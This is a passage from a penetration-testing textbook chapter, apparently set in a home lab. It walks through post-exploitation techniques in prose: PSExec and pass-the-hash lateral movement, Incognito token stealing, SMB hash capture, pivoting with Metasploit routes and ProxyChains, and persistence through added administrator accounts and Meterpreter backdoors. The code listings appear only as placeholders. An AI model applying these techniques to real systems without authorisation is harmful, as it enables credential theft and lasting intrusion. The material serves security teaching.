    as shown in [Example 13-20](ch13.xhtml#viewing_local_administrators_with_net_co
    "Example 13-20. Viewing local administrators with net commands").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-20. Viewing local administrators with `net` commands
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE38]'
  prefs: []
  type: TYPE_PRE
- en: To exit the shell and drop back into Meterpreter, type `exit`.
  prefs: []
  type: TYPE_NORMAL
- en: These are just a couple of examples of useful `net` commands. We’ll look at
    using `net` commands to add a user later in this chapter.
  prefs: []
  type: TYPE_NORMAL
- en: Another Way In
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: In [Chapter 5](ch05.xhtml "Chapter 5. Information Gathering"), we used Nmap
    to run a UDP scan. By definition, UDP scans are not as exact as TCP scans. For
    example, port 69/UDP on the Windows XP target, traditionally the port for TFTP,
    returned `open|filtered` in our UDP Nmap scan. Because our scan did not receive
    any response, it was unclear if anything was listening there at all. Short of
    fuzzing the TFTP server and possibly crashing it, it would be difficult to ascertain
    which TFTP software, if any, is running. Now that we have access to the system,
    we can further investigate running software for any vulnerabilities we may have
    missed.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Earlier in the chapter we used the Meterpreter `ps` command to view all running
    processes on the Windows XP target. One of these is 3CTftpSvc.exe, an older version
    of the 3Com TFTP service that is subject to a buffer overflow condition in the
    TFTP long transport mode. (We’ll write an exploit for this issue by hand in [Chapter 19](ch19.xhtml
    "Chapter 19. Fuzzing, Porting Exploits, and Metasploit Modules"), but there’s
    a Metasploit module for this issue as well.) Though it would be difficult for
    an attacker to identify this issue remotely, the software is still vulnerable,
    and we should include it in our pentest report.
  prefs: []
  type: TYPE_NORMAL
- en: It may be that you won’t discover a network-facing vulnerability until after
    you have gained access to the system. Without sending random TFTP input to the
    server and analyzing the results, it would be difficult for us to find this issue.
  prefs: []
  type: TYPE_NORMAL
- en: Checking Bash History
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: One place to look for potentially interesting information on a Linux system
    is in a user’s Bash history. When a Bash shell is closed, the commands that have
    been executed are written to a file called *.bash_history* in the user’s home
    directory. A perhaps rather contrived example where the user’s password is saved
    in plaintext in the Bash history file is shown here.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE39]'
  prefs: []
  type: TYPE_PRE
- en: Lateral Movement
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Once we have access to one system in a networked environment, can we use it
    to access additional systems and their sensitive data? If our exploited system
    is a member of a domain, we can certainly try to compromise a domain account or
    ideally get domain administrator access so that we can log in to and manage all
    systems in the domain.
  prefs: []
  type: TYPE_NORMAL
- en: But even if you can’t get control of a domain, you may still be able to access
    the systems in that domain if they were all installed from the same system install
    image with the same local administrator password that has never been changed.
    If we can crack this password for one machine, we may be able to log in to many
    machines in the environment without domain access. Also, if a user has an account
    on multiple systems, he or she may use the same password on each system, which
    might allow us to log in with credentials we found elsewhere in the environment.
    (Good password policies help prevent these kinds of vulnerabilities, but passwords
    are often the weakest link, even in high-security environments.)
  prefs: []
  type: TYPE_NORMAL
- en: Let’s look at a few techniques for turning access to one system into access
    to many.
  prefs: []
  type: TYPE_NORMAL
- en: PSExec
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: The PSExec technique originated in the Sysinternals Windows management tool
    set in the late 1990s. The utility worked by using valid credentials to connect
    to the ADMIN$ share on the Windows XP SMB server. PSExec uploads a Windows service
    executable to the ADMIN$ share and then connects to the Windows Service Control
    Manager using remote procedure call (RPC) to start the executable service. The
    service then sets up an SMB named `pipe` to send commands and remotely control
    the target system.
  prefs: []
  type: TYPE_NORMAL
- en: The Metasploit module *exploit/windows/smb/psexec* implements a very similar
    technique. The module requires a running SMB server on the target and credentials
    that give access to the ADMIN$ share.
  prefs: []
  type: TYPE_NORMAL
- en: In [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks"), we cracked the password
    hashes for users on our Windows XP target. You can probably imagine using the
    found credentials and PSExec to gain access to additional systems. Use the credentials
    *georgia:password* with the PSExec module, as shown in [Example 13-21](ch13.xhtml#using_the_psexec_module
    "Example 13-21. Using the PSExec module").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-21. Using the PSExec module
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE40]'
  prefs: []
  type: TYPE_PRE
- en: In addition to `RHOST`, we need to tell the module which SMBDomain, SMBUser,
    and SMBPass to use. Our Windows XP target is not a member of a domain, so we can
    leave the SMBDomain option at the default, `WORKGROUP`.
  prefs: []
  type: TYPE_NORMAL
- en: Set SMBUser to `georgia` ❶ and SMBPass to `password` ❷, our discovered credentials.
    Then run the exploit module. The module embeds the chosen payload (in this case,
    the default *windows/meterpreter/reverse_tcp*) into a Windows service image executable.
    After uploading the executable and contacting Windows Service Control Manager,
    the service copies the shellcode into executable memory for the service process
    and redirects execution to the payload. Thus our payload runs and connects back
    to our Metasploit listener on Kali. Even though we logged on as the user *georgia*,
    because our payload is running as a system service, our session automatically
    has system privileges.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: This is why we made the change to the Windows XP Security Policy in [Chapter 1](ch01.xhtml
    "Chapter 1. Setting Up Your Virtual Lab"). If Windows XP were a member of a domain,
    we could fill in the SMBDomain option and use PSExec to get System access on any
    system where the domain user was a local administrator. This is a great way to
    move around a network looking for interesting information, additional password
    hashes, and more vulnerabilities.
  prefs: []
  type: TYPE_NORMAL
- en: Pass the Hash
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Our previous attack relied on our ability to reverse the password hash and gain
    access to the plaintext password for a user account. Of course, in the case of
    our Windows XP target, this is trivial because it uses the entirely crackable
    LM hashing algorithm.
  prefs: []
  type: TYPE_NORMAL
- en: In [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks"), we learned that when
    we have only the NTLM user authentication hash of a password, instead of the weaker
    LM version, our ability to reverse the hash in a reasonable amount of time depends
    on the weakness of the password, the strength of our wordlist, and even the algorithms
    employed by the password-cracking program. If we can’t reverse the password hash,
    we’re going to have a tough time logging in to other systems with the plaintext
    credentials.
  prefs: []
  type: TYPE_NORMAL
- en: PSExec comes to the rescue again. When a user logs in over SMB, his or her password
    is not sent to the target in plaintext. Instead, the target system issues a challenge
    that can be answered only by someone with the correct password. In this case,
    the answer to the challenge is the LM- or NTLM-hashed password, depending on the
    implementation.
  prefs: []
  type: TYPE_NORMAL
- en: When you log in to a remote system, your Windows application calls a utility
    to hash the password, and that hash is sent to the remote system for authentication.
    The remote system assumes that if you send the correct hash, you must have access
    to the correct plaintext password—that is, after all, one of the fundamentals
    of one-way hash functions. Can you think of a scenario where you might have access
    to password hashes but not the plaintext passwords?
  prefs: []
  type: TYPE_NORMAL
- en: In [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks"), we were able to reverse
    all password hashes on our target systems. Additionally, on our Windows XP target,
    we were able to reverse the LM hashes regardless of the strength of the password.
    But let’s simulate a situation where we have only password hashes, as shown with
    the Meterpreter `hashdump` command in [Example 13-22](ch13.xhtml#using_hashdump
    "Example 13-22. Using hashdump").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-22. Using `hashdump`
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE41]'
  prefs: []
  type: TYPE_PRE
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'When using the `hashdump` Meterpreter command against newer Windows operating
    systems, you may find that it fails. An alternative is the post module: *post/windows/gather/hashdump*.
    There is even post/windows/gather/smart_hashdump, which can not only gather local
    hashes but also active directory hashes if you have exploited a domain controller.
    So if at first you don’t succeed in dumping password hashes on a pentest, explore
    additional options.'
  prefs: []
  type: TYPE_NORMAL
- en: Let’s use the Metasploit PSExec module to take advantage of how SMB authenticates
    and a technique called *Pass the Hash*. Instead of setting the SMBPass option
    to *georgia*’s password, copy in the LM and NTLM hashes for *georgia* from the
    `hashdump` in [Example 13-23](ch13.xhtml#psexec_pass_the_hash "Example 13-23. PSExec
    Pass the Hash") as the SMBPass option.
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-23. PSExec Pass the Hash
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE42]'
  prefs: []
  type: TYPE_PRE
- en: Again we’re able to use PSExec to get a Meterpreter session. Even without knowing
    the plaintext password, the password hash alone can be enough to get access to
    other systems in the environment using PSExec.
  prefs: []
  type: TYPE_NORMAL
- en: SSHExec
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Like PSExec for Windows, we can use SSHExec to move through an environment’s
    Linux systems if we have even one set of valid credentials, which are likely to
    work elsewhere in the environment. The Metasploit module *multi/ssh/sshexec* and
    its options are shown in [Example 13-24](ch13.xhtml#using_sshexec "Example 13-24. Using
    SSHExec").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-24. Using SSHExec
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE43]'
  prefs: []
  type: TYPE_PRE
- en: In this example, we know the credentials *georgia:password* from having cracked
    them in [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks"). Although in this
    case we will just be logging into the same host again (similar to what we did
    in [PSExec](ch13.xhtml#psexec "PSExec")), we could use this same technique on
    other hosts in that same environment that have an account for *georgia*.
  prefs: []
  type: TYPE_NORMAL
- en: As with PSExec, we need valid credentials in order to authenticate. We set the
    `USERNAME` to *georgia* ❶ and `PASSWORD` to *password* ❷, and then choose *linux/x86/meterpreter/reverse_*tcp
    as the payload.
  prefs: []
  type: TYPE_NORMAL
- en: Unlike with PSExec (which uploaded a binary and ran it as a System service,
    automatically giving us System privileges), with SSHExec we are still user *georgia*.
    You can see how this exploit could prove to be a quick way to move around an environment
    in search of additional information and vulnerabilities on other Linux systems.
  prefs: []
  type: TYPE_NORMAL
- en: Token Impersonation
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Now that we know we might not even need plaintext passwords to gain access to
    other systems, is there any case where we may not even need the password hashes?
  prefs: []
  type: TYPE_NORMAL
- en: One interesting Windows security construct is the concept of *tokens*. Tokens
    are primarily used for access control. Based on the token of a process, the operating
    system can make decisions about which resources and operations should be made
    available to it.
  prefs: []
  type: TYPE_NORMAL
- en: Think of a token as a kind of temporary key that gives you access to certain
    resources without having to enter your password every time you want to perform
    a privileged operation. When a user logs in to the system interactively, such
    as directly through the console or from a remote desktop, a *delegation token*
    is created.
  prefs: []
  type: TYPE_NORMAL
- en: Delegation tokens allow the process to impersonate the token on the local system
    as well as on the network, for example on other systems in a domain. Delegation
    tokens contain credentials and can be used to authenticate with other systems
    that use these credentials, such as the domain controller. Tokens persist until
    reboot, and even if a user logs out, his or her token will still be present on
    the system until it shuts down. If we can steal another token on the system, we
    can potentially gain additional privileges and even access to additional systems.
  prefs: []
  type: TYPE_NORMAL
- en: Incognito
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'We’re on a compromised system: our Windows XP target. Which tokens are on the
    system, and how do we steal them? *Incognito* was originally a standalone tool
    developed by security researchers conducting research into using token stealing
    for privilege escalation, but it has since been added as an extension to Meterpreter.
    Incognito will help us enumerate and steal all the tokens on a system.'
  prefs: []
  type: TYPE_NORMAL
- en: Incognito is not loaded into Meterpreter by default, but we can add it with
    the `load` command, as shown here. Use one of your Meterpreter sessions currently
    running as system, or use privilege escalation to elevate your access. (*System*
    has access to all tokens on the target.)
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE44]'
  prefs: []
  type: TYPE_PRE
- en: Before we use Incognito, switch users on your Windows XP target and log in as
    *secret* with the password *Password123*. This login will create a delegation
    token on the target for us to impersonate. As we list tokens, Incognito searches
    all handles on the system to determine which ones belong to tokens using low-level
    Windows API calls. To see all the user tokens available with the Meterpreter Incognito,
    enter the command **`list_tokens -u`** as shown in [Example 13-25](ch13.xhtml#enumerating_tokens_with_incognito
    "Example 13-25. Enumerating tokens with Incognito").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-25. Enumerating tokens with Incognito
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE45]'
  prefs: []
  type: TYPE_PRE
- en: We see tokens for both *georgia* and *secret*. Let’s try stealing *secret*’s
    delegation token, effectively gaining the privileges of this user. Use the `impersonate_token`
    command to steal the token, as shown in [Example 13-26](ch13.xhtml#stealing_a_token_with_incognito
    "Example 13-26. Stealing a token with Incognito"). (Note that we use two backslashes
    to escape the backslash between the domain—in this case, the local machine name—and
    the username.)
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-26. Stealing a token with Incognito
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE46]'
  prefs: []
  type: TYPE_PRE
- en: 'Having stolen *secret*’s token, if we run `getuid` we should see that we are
    effectively now the user *secret*. This can be especially interesting when in
    a domain: If *secret* is a domain administrator, we are now a domain administrator
    as well, and we can do things like create a new domain administrator account or
    change the domain administrator’s password. (We’ll look at how to add accounts
    from the command line in [Persistence](ch13.xhtml#persistence "Persistence").)'
  prefs: []
  type: TYPE_NORMAL
- en: SMB Capture
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Let’s look at one more interesting consequence of token stealing. In a domain,
    password hashes for domain users are stored only on the domain controller, which
    means that running a hashdump on an exploited system will give us password hashes
    only for local users. We don’t have a domain set up, so *secret*’s password hash
    is stored locally, but imagine that *secret* is instead a domain user. Let’s look
    at a way of capturing the password hashes without gaining access to the domain
    controller by passing the hash to an SMB server we control and recording the results.
  prefs: []
  type: TYPE_NORMAL
- en: Open a second instance of Msfconsole, and use the module *auxiliary/server/capture/smb*
    to set up an SMB server and capture any authentication attempts. Like the client-side
    attack modules we studied in [Chapter 10](ch10.xhtml "Chapter 10. Client-Side
    Exploitation"), this module does not directly attack another system; it just sets
    up a server and waits. Set up the module options as shown in [Example 13-27](ch13.xhtml#using_the_smb_capture_module
    "Example 13-27. Using the SMB capture module").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-27. Using the SMB capture module
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE47]'
  prefs: []
  type: TYPE_PRE
- en: You can save the results to a *CAINPWFILE* or a *JOHNPWFILE*, which will save
    the captured hashes in the formats expected by the Cain and Abel password tool
    for Windows and John the Ripper, respectively. Let’s set it to *JOHNPWFILE* ❶
    because we learned how to use John in [Chapter 9](ch09.xhtml "Chapter 9. Password
    Attacks").
  prefs: []
  type: TYPE_NORMAL
- en: Now return to your Meterpreter session where you impersonated *secret*’s token
    in the previous section, and drop to a shell, as shown next. Because we’ve stolen
    *secret*’s token, this shell should be running as *secret*. Knowing that delegation
    tokens include credentials to authenticate with other systems, we’ll use the `net
    use` Windows command to attempt to authenticate with our fake SMB capture server.
  prefs: []
  type: TYPE_NORMAL
- en: Connect to any share you like on the Kali SMB server. The login will fail, but
    the damage will be done.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE48]'
  prefs: []
  type: TYPE_PRE
- en: Returning to your SMB Capture Msfconsole window, you should see that you’ve
    captured a set of password hashes.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE49]'
  prefs: []
  type: TYPE_PRE
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'This exercise can be a bit flaky, particularly without a Windows domain present.
    You might have trouble capturing the hash and instead get something like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE50]'
  prefs: []
  type: TYPE_PRE
- en: '*This is a common issue. Just try to understand the concepts so you can try
    them in client environments where Windows domains are deployed.*'
  prefs: []
  type: TYPE_NORMAL
- en: The results are saved in the proper format in the JOHNPWFILE Metasploit module
    option for *auxiliary/server/capture/smb*. For example, since we set our JOHNPWFILE
    as /*root/johnfile*, the file to feed into John is */root/johnfile_netntlm*. When
    you compare the hashes to those dumped with `hashdump` in [Example 13-22](ch13.xhtml#using_hashdump
    "Example 13-22. Using hashdump"), you’ll see that the hashes for *secret* differ.
    What’s going on? As it turns out, these hashes are for NETLM and NETNTLM, which
    are a bit different than the regular LM and NTLM Windows hashes we worked with
    in [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks"). And when you look at
    the *JOHNPWFILE*, you’ll see that its format is a bit different from what we’ve
    seen previously with John the Ripper.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE51]'
  prefs: []
  type: TYPE_PRE
- en: In particular, the hash entry has taken note of the `CHALLENGE` option set in
    Metasploit. Though the user *secret* has a local hash on our Windows XP target
    that would save us the trouble of cracking NETLM and NETNTLM hashes, this is a
    useful trick for grabbing password hashes when working with domain user accounts,
    which store their password hashes only on the domain controllers.
  prefs: []
  type: TYPE_NORMAL
- en: Pivoting
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Now let’s see if we can use access to a system to gain access to another network
    entirely. Typically an organization has only a few Internet-facing systems—hosting
    services that need to be made available to the Internet such as web servers, email,
    VPNs, and so on. These services may be hosted by a provider such as Google or
    GoDaddy, or they may be hosted in house. If they are hosted in house, gaining
    access to them from the Internet may give you access to the internal network.
    Ideally their internal network will be segmented by business unit, level of sensitivity,
    and so on, such that access to one machine does not give direct network access
    to all machines in the enterprise.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Internet-facing systems may be *dual homed*, or a member of multiple networks,
    namely the Internet and an internal network. A security best practice is to keep
    dual-homed systems segregated from sensitive internal network resources in a demilitarized
    zone, but I have performed penetration tests for clients who have Internet-facing
    systems as part of their internal domain. All I had to do was exploit their web
    application, which had a default password for the administrative account, and
    upload a PHP shell as we did to XAMPP in [Chapter 8](ch08.xhtml "Chapter 8. Exploitation"),
    and suddenly I had access to a system on their internal domain. Hopefully, most
    of your clients will require a few more steps between piercing the perimeter and
    domain access.
  prefs: []
  type: TYPE_NORMAL
- en: When we set up our Windows 7 target in [Chapter 1](ch01.xhtml "Chapter 1. Setting
    Up Your Virtual Lab"), we gave it two virtual network adapters. We connected one
    to the bridged network where it could talk to the other targets and our Kali virtual
    machine. The other virtual adapter is connected to the host-only network. For
    this exercise, switch the Windows XP target to the host-only network so it is
    no longer accessible by the Kali system. (For more information on changing virtual
    network settings, see [Creating the Windows 7 Target](ch01.xhtml#creating_the_windows_7_target
    "Creating the Windows 7 Target").)
  prefs: []
  type: TYPE_NORMAL
- en: 'Though this is a Windows system, Meterpreter allows us to use the `ifconfig`
    command to see networking information. As shown in [Example 13-28](ch13.xhtml#dual-homed_system_networking_information
    "Example 13-28. Dual-homed system networking information"), the Windows 7 target
    is part of two networks: the 192.168.20.0/24 network, which also includes our
    Kali system, and the 172.16.85.0/24 network, which our Kali system does not have
    access to.'
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-28. Dual-homed system networking information
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE52]'
  prefs: []
  type: TYPE_PRE
- en: We can’t attack any systems in the 172.16.85.0 network directly from Kali. However,
    because we have access to the Windows 7 target, we can use it as a jumping-off
    point, or *pivot*, to further explore this second network, as shown in [Figure 13-3](ch13.xhtml#pivoting_through_an_exploited_system
    "Figure 13-3. Pivoting through an exploited system").
  prefs: []
  type: TYPE_NORMAL
- en: '![Pivoting through an exploited system](httpatomoreillycomsourcenostarchimages2030424.png.jpg)Figure 13-3. Pivoting
    through an exploited system'
  prefs: []
  type: TYPE_NORMAL
- en: 'At this point we could start uploading our hack tools to the Windows 7 target
    to begin the penetration test on the 172.16.85.0 network, but that attempt would
    likely be caught by antivirus software, and we’d have to clean up the mess left
    behind. Metasploit gives us another option: We can route all of the traffic for
    our target network through an open Metasploit session.'
  prefs: []
  type: TYPE_NORMAL
- en: Adding a Route in Metasploit
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: The `route` command in Metasploit tells Metasploit where to route traffic. Instead
    of routing traffic to an IP address, we send traffic destined for a network through
    a specific open session. In this case, we want to send all traffic headed to the
    172.16.85.0 network through the Windows 7 session. The syntax for the route command
    in Metasploit is `route add` *`network <subnet`* *`mask> <session id>`*.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE53]'
  prefs: []
  type: TYPE_PRE
- en: Now any traffic we send from Metasploit to the 172.16.85.0 network will automatically
    be routed through the Windows 7 session (session 2 in my case). We can set options
    such as `RHOST` or `RHOSTS` to systems in this network, and Metasploit will get
    traffic to the right place.
  prefs: []
  type: TYPE_NORMAL
- en: Metasploit Port Scanners
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: One of the first things we did when information gathering in [Chapter 5](ch05.xhtml
    "Chapter 5. Information Gathering") was to port scan our targets with Nmap. We
    won’t be able to use external tools with our Metasploit route, but luckily Metasploit
    has some port-scanning modules we can use instead, like the *scanner/portscan/tcp*
    module, which will perform a simple TCP port scan, as shown in [Example 13-29](ch13.xhtml#port_scanning_with_metasploit
    "Example 13-29. Port scanning with Metasploit").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-29. Port scanning with Metasploit
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE54]'
  prefs: []
  type: TYPE_PRE
- en: Set the `RHOSTS` option as usual for auxiliary modules. By default Metasploit
    scans port 1-10000 ❶, though you can change this option if you wish.
  prefs: []
  type: TYPE_NORMAL
- en: Though Metasploit’s port scanners are not as powerful as Nmap’s, we can at least
    see that the SMB port is open. From here we might run the *auxiliary/scanner/smb/smb_version*
    module followed by the `check` function with the *windows/smb/ms08_067_netapi*
    module to lead us toward exploiting the Windows XP target with the MS08-067 exploit
    through a pivot.
  prefs: []
  type: TYPE_NORMAL
- en: Running an Exploit through a Pivot
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Because our Windows XP and Kali systems are on different networks, a reverse
    payload won’t work for our exploit because the Windows XP target won’t know how
    to route traffic back to 192.168.20.9\. (Of course, if our Kali system was on
    the Internet and the internal network we are attacking could route to the Internet,
    that would not be the case. However, here our host-only network does not know
    how to route to our bridged network.) Instead, we’ll use a *bind payload*. Metasploit’s
    bind handler will have no trouble routing through the pivot we set up. The *windows/meterpreter/bind_tcp*
    payload will work as shown in [Example 13-30](ch13.xhtml#exploiting_through_a_pivot
    "Example 13-30. Exploiting through a pivot").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-30. Exploiting through a pivot
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE55]'
  prefs: []
  type: TYPE_PRE
- en: We’ve gotten another session, this time through a pivot.
  prefs: []
  type: TYPE_NORMAL
- en: Socks4a and ProxyChains
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Pivoting through Metasploit is all well and good, but we’re limited to using
    Metasploit modules. Perhaps there is a way to proxy other tools through Metasploit’s
    pivot? In fact there is: using the ProxyChains tool (which redirects traffic to
    proxy servers) to send our traffic from other Kali tools through Metasploit.'
  prefs: []
  type: TYPE_NORMAL
- en: But first we need to set up a proxy server in Metasploit. Like the SMB server
    module we used to capture NETLM and NETNTLM hashes earlier in this chapter, Metasploit
    also has a Socks4a proxy server module (*auxiliary/server/socks4a*). [Example 13-31](ch13.xhtml#setting_up_a_socks4a_proxy_server_in_met
    "Example 13-31. Setting up a Socks4a proxy server in Metasploit") shows how to
    set up the proxy server.
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-31. Setting up a Socks4a proxy server in Metasploit
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE56]'
  prefs: []
  type: TYPE_PRE
- en: Leave the options as the defaults, but note that the server will be listening
    on port 1080.
  prefs: []
  type: TYPE_NORMAL
- en: Now we need to edit the configuration file for ProxyChains at */etc/proxychains.conf*.
    Scroll down to the bottom of the file in an editor, and you should see that by
    default, ProxyChains is set to route traffic to the Tor network as shown here.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE57]'
  prefs: []
  type: TYPE_PRE
- en: 'We need to change the proxy value to Metasploit’s listening server. Replace
    port 9050 (for Tor) with 1080 (for Metasploit). The line should now read:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE58]'
  prefs: []
  type: TYPE_PRE
- en: Save the configuration file for ProxyChains. Now we can run tools like Nmap
    from outside Metasploit against our Windows XP target, as long as we preface them
    with `proxychains` as shown in [Example 13-32](ch13.xhtml#running_nmap_through_proxychains
    "Example 13-32. Running Nmap through ProxyChains"). (The Metasploit route must
    still be active because ProxyChains simply redirects the traffic to Metasploit,
    which will forward the traffic through the pivot.)
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-32. Running Nmap through ProxyChains
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE59]'
  prefs: []
  type: TYPE_PRE
- en: '[Example 13-32](ch13.xhtml#running_nmap_through_proxychains "Example 13-32. Running
    Nmap through ProxyChains") shows Nmap being run against the Windows XP host through
    the pivot with ProxyChains. The option `-Pn` tells Nmap not to try to ping through
    the proxy. We start with a simple TCP connect scan (`-sT`) and then run a version
    scan (`-sV`). For the sake of simplicity, I’ve limited the ports to 445 and 446
    with the `-p` option. We see that the connection is `OK` on port 445 ❶ but `denied`
    on port 446 ❷. This makes sense because the SMB server is running on port 445,
    but nothing is running on port 446\. (If any of this is unfamiliar, see [Port
    Scanning with Nmap](ch05.xhtml#port_scanning_with_nmap "Port Scanning with Nmap").)'
  prefs: []
  type: TYPE_NORMAL
- en: This is just one way to run tools external to Metasploit through a pivot. While
    doing so does slow things down a bit, it can be quite useful to have access to
    other tools in Kali.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Not all vulnerabilities will be exploitable through a pivot. In general, it
    depends on how the vulnerable protocols work. Another technique to look into is
    SSH tunneling. See my blog at *[http://www.bulbsecurity.com/](http://www.bulbsecurity.com/)*
    for more information.
  prefs: []
  type: TYPE_NORMAL
- en: Persistence
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: A great thing about our Meterpreter sessions is also a bad thing. Because the
    host process resides entirely in memory, if it dies, our Meterpreter session dies
    as well, and if the system restarts we lose our session. If we lose network access
    to the target, our session may die as well.
  prefs: []
  type: TYPE_NORMAL
- en: Rather than re-exploiting the same vulnerability or resending social-engineering
    attacks, it would be ideal if we had a way to regain access in the future. Persistence
    methods can be as simple as adding a user to a system or as advanced as kernel-level
    rootkit that hides itself even from the Windows API making it virtually undetectable.
    In this section we’ll look at a few simple ways to gain persistence on a target
    system to give you a good starting point for your pentests.
  prefs: []
  type: TYPE_NORMAL
- en: Adding a User
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Perhaps the simplest way to gain persistence is to add a new user. Being able
    to log in to the system directly via SSH, RDP, and so on makes it easy to access
    a system in the future. (As with all other changes you make on your targets, remember
    to delete any added user accounts before finishing the pentest.)
  prefs: []
  type: TYPE_NORMAL
- en: On a Windows system, use `net user` *`username`* *`password`* `/add` to add
    a new user, as shown here.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE60]'
  prefs: []
  type: TYPE_PRE
- en: We should also add our new user to the relevant groups with the command `net
    localgroup` *`group username`* `/add`. For example, if we want to log in via remote
    desktop, we should add the user to the Remote Desktop Users group. The Administrators
    group is also a good group to add our user to as shown here.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE61]'
  prefs: []
  type: TYPE_PRE
- en: If your client has a Windows domain, you can add users to the domain and add
    them to domain groups (if you have sufficient privileges) by tacking on `/domain`
    at the end of a command. For example, if you are able to steal a domain administrator’s
    token, you can use the following commands to add a domain administrator account,
    giving you full control of the entire domain.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE62]'
  prefs: []
  type: TYPE_PRE
- en: On the Linux target, we can use `adduser` to add a user account. Ideally we
    should also add our new user to the sudoers group so we have root privileges.
  prefs: []
  type: TYPE_NORMAL
- en: Metasploit Persistence
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: The Meterpreter script *persistence* automates the creation of a Windows backdoor
    that will automatically connect back to a Metasploit listener at startup, login,
    and so on, based on the options we use when creating it. The options for the *persistence*
    script are shown in [Example 13-33](ch13.xhtml#meterpreter_persistence_script
    "Example 13-33. Meterpreter persistence script").
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-33. Meterpreter persistence script
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE63]'
  prefs: []
  type: TYPE_PRE
- en: As you can see we have a lot of customization options for our persistent payload.
    We can have the persistence agent start at boot or when the user logs in. We can
    set an interval between attempts to connect to the handler. We can change where
    the agent is written on the target system. We can also specify the remote host
    and port for the agent to connect back to. We can even have Metasploit automatically
    set up a handler to catch the incoming connection. In the process of setting up
    persistence, Metasploit has to write the persistence agent to the disk, so Meterpreter
    is no longer completely residing in memory at this point. When the persistence
    agent runs at startup (-`X`), a Visual Basic script is uploaded to the *%TEMP%*
    folder, and a registry entry is added to the list of programs to run at startup.
    When the persistence agent runs upon login (`-U`), the process is similar, but
    the registry entry is set to run at login. When the persistence agent runs as
    a service (`-S`), a Windows system service is created that will call the Visual
    Basic script from *%TEMP%*.
  prefs: []
  type: TYPE_NORMAL
- en: Let’s run the *persistence* script, as shown in [Example 13-34](ch13.xhtml#running_the_persistence_script
    "Example 13-34. Running the persistence script"), telling the agent to connect
    back to our Kali machine when the user logs in.
  prefs: []
  type: TYPE_NORMAL
- en: Example 13-34. Running the persistence script
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE64]'
  prefs: []
  type: TYPE_PRE
- en: After running the script, place the Meterpreter session in the background with
    the Meterpreter command `background`, and set up a handler to catch the persistence
    agent. Now restart the Windows XP target. When it restarts, log in as *georgia*,
    and you should receive another Meterpreter session.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: If it doesn’t work the first time, try restarting and logging in again.
  prefs: []
  type: TYPE_NORMAL
- en: Creating a Linux cron Job
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: On both Windows and Linux systems, we can automatically start tasks at a given
